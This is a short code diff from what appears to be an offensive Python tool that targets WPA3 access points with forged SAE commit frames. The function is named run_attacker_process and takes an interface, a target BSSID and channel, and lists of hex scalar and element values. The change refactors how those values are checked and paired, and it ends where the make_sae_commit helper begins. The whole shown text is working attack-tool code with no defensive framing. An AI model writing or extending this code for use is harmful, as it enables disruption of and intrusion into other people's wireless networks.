@@ -329,19 +329,22 @@ def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list
         logger.error(f"[ATTACK] {interface}: Channel setup failed")
         return
 
-    # Decode & validate SAE lists
+# Decode & validate SAE lists safely as PAIRS
     try:
-        s_bytes = [bytes.fromhex(s.strip()) for s in scalar_hex_list if "INSERT" not in s and len(s.strip()) == 64]
-        f_bytes = [bytes.fromhex(f.strip()) for f in finite_hex_list if "INSERT" not in f and len(f.strip()) == 128]
-        if not s_bytes or not f_bytes:
-            raise ValueError("Invalid SAE lists")
+        valid_pairs =[
+            (bytes.fromhex(s.strip()), bytes.fromhex(f.strip())) 
+            for s, f in zip(scalar_hex_list, finite_hex_list)
+            if "INSERT" not in s and len(s.strip()) == 64 
+            and "INSERT" not in f and len(f.strip()) == 128
+        ]
+        if not valid_pairs:
+            raise ValueError("No valid SAE pairs found in lists")
     except Exception as e:
         logger.error(f"[ATTACK] {interface}: SAE decode failed: {e}")
         return
 
     def get_random_sae():
-        idx = random.randint(0, min(len(s_bytes), len(f_bytes)) - 1)
-        return s_bytes[idx], f_bytes[idx]
+        return random.choice(valid_pairs)
 
     def make_sae_commit(mac, seq=1):
         scalar, finite = get_random_sae()
